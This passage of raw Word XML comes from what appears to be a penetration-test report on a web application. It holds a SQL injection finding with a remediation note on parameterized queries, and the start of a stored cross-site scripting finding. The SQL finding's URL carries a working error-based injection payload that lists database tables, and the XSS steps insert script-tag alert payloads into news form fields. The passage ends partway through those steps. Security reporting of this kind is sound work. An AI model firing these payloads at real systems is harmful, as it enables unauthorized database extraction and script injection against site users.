            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId18" w:history="1">
              <w:r w:rsidR="009F5B1D" w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/search.php?project_id=0&amp;sticky_issues=off&amp;sortby=id%2Cstatus%2Cseverity%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&amp;dir=DESC&amp;hide_status_id=-2</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="009F5B1D" w:rsidRDefault="009F5B1D" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="009F5B1D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>sort</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="009F5B1D" w:rsidRPr="009F5B1D" w:rsidRDefault="003D2007" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Observe the SQL Injection stack trace.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="009F5B1D" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="381F4608" wp14:editId="1F0177F5">
                  <wp:extent cx="7245350" cy="38900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245350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Fig 2</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL Injection</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="0060276E" w:rsidRPr="0060276E" w:rsidRDefault="00A81704" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0060276E" w:rsidRPr="0060276E">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>To prevent and/or fix SQL Injection vulnerabilities,</w:t>
            </w:r>
            <w:r w:rsidR="0060276E">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> start using </w:t>
            </w:r>
            <w:r w:rsidR="0060276E" w:rsidRPr="0060276E">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Parameterize SQL queries. Parameterized queries are simple to write and understand. They force you to define the SQL query and use placeholders for user-provided variables in the query. After the SQL statement is defined, you can pass each parameter to the query. This allows the database to distinguish between the SQL command and data supplied by a user. If an attacker inputs SQL commands, the parameterized query treats them as untrusted input and the database does not execute injected SQL commands. If you properly parametrize SQL queries, all user input that is passed to the database is treated as data and can never be confused as being part of a command.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00714F55" w:rsidRDefault="00714F55" w:rsidP="00714F55">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00E96BAE" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00494827" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00F62870" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId20" w:history="1">
              <w:r w:rsidR="00F62870" w:rsidRPr="00F62870">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/news_menu_page.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00F62870" w:rsidRPr="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00F62870" w:rsidRDefault="00F62870" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Headline, Body</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00F62870">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="16"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to above URL and Enter </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert`12`</w:t>
            </w:r>
            <w:r w:rsidR="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">&lt;/script&gt; in the </w:t>
            </w:r>
            <w:r w:rsidR="00F62870" w:rsidRPr="00DF1044">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Headline</w:t>
            </w:r>
            <w:r w:rsidR="00F62870">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> input box.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00F62870" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="16"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Enter </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert`13</w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>`&lt;/script&gt;</w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> in the </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044" w:rsidRPr="00DF1044">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Body</w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> textarea and Click on the </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044" w:rsidRPr="00DF1044">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Post News</w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00DF1044">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>button.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00DF1044" w:rsidRDefault="00DF1044" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="16"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to URL </w:t>
            </w:r>
            <w:hyperlink r:id="rId21" w:history="1">
              <w:r w:rsidRPr="00DF1044">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/main_page.php</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00DF1044" w:rsidRPr="00DF1044" w:rsidRDefault="00DF1044" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="16"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Observe the popup message</w:t>
            </w:r>
            <w:r w:rsidR="0041513E">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
